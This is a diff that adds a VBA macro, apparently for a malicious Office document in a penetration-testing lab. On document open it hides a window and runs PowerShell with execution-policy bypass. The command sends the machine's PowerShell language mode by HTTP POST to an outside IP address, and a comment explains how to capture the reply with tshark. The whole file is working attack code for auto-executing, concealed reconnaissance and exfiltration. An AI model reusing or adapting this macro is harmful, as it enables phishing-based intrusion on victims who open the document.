@@ -1,0 +1,14 @@
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    'Need to listen for a response with: tshark -i tun0 -Y "http.request.method == POST" -T fields -e text
+    str = "powershell -ep bypass -c $res=$ExecutionContext.SessionState.LanguageMode; iwr -uri http://192.168.49.58/result -Method POST -Body $res"
+    Shell str, vbHide
+End Sub
